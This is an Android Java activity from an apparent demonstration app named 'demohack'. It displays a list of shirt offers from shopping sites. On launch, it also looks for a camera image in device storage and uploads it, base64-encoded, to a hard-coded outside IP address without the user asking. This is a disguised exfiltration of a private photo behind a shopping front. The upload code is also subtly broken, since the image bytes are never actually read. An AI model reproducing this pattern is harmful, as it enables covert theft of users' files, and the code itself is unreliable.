package com.example.abiduzair.demohack;

import android.app.ProgressDialog;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.AsyncTask;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.support.v7.widget.Toolbar;
import android.util.Base64;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ImageView;
import android.widget.ListView;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.ArrayList;

/**
 * Created by AbidUzair on 25-06-2017.
 */

public class UploadActivity extends AppCompatActivity {

    Toolbar mToolbar;
    ListView mListView;
    ArrayList<Product> productsList;

    private static String UPLOAD_URL = "52.179.158.113:80";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_upload);
        mListView = (ListView)findViewById(R.id.listview);
        productsList = new ArrayList<Product>();
        productsList.add(new Product(R.drawable.shirt,"Flipkart","45","https://www.flipkart.com"));
        productsList.add(new Product(R.drawable.shirt2,"Snapdeal","55","https://www.snapdeal.com"));
        productsList.add(new Product(R.drawable.shirt3,"Amazon","30","https://www.amazon.in"));
        productsList.add(new Product(R.drawable.shirt4,"Flipkart","35","https://www.flipkart.com"));
        productsList.add(new Product(R.drawable.shirt5,"Jabong","15","https://www.jabong.com"));

        CustomListAdapter customListAdapter =
                new CustomListAdapter(UploadActivity.this,R.layout.listview_item,productsList);
        mListView.setAdapter(customListAdapter);
        mListView.setOnItemClickListener(new AdapterView.OnItemClickListener(){
            @Override
            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                Intent intent = new Intent();
                intent.setAction(Intent.ACTION_VIEW);
                intent.addCategory(Intent.CATEGORY_BROWSABLE);
                intent.setData(Uri.parse(productsList.get(position).getURL()));
                startActivity(intent);
            }
        });
        File imgFile = new  File("/storage/emulated/0/camera_app/cam_image.jpg");
        if(imgFile.exists()){
            uploadImage(imgFile.getAbsolutePath());
        }
    }

    private void uploadImage(String picturePath){
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] imageBytes = baos.toByteArray();
        String encodedImage = Base64.encodeToString(imageBytes, Base64.DEFAULT);
        RequestPackage rp = new RequestPackage();
        rp.setMethod("POST");
        rp.setUri(UPLOAD_URL);
        rp.setSingleParam("base64",encodedImage);
        rp.setSingleParam("ImageName","cam_image"+".jpg");

        new uploadToServer().execute(rp);
    }

    public class uploadToServer extends AsyncTask<RequestPackage, Void,String> {
        private ProgressDialog pd = new ProgressDialog(UploadActivity.this);

        protected void onPreExecute(){
            super.onPreExecute();
            pd.setMessage("Image Uploading!,please wait...");
            pd.setCancelable(false);
            pd.show();
        }

        @Override
        protected String doInBackground(RequestPackage... params) {
            String content = MyHttpURLConnection.getData(params[0]);
            return content;
        }

        protected void onPostExecute(String result) {
            super.onPostExecute(result);
            pd.hide();
            pd.dismiss();
        }
    }
}
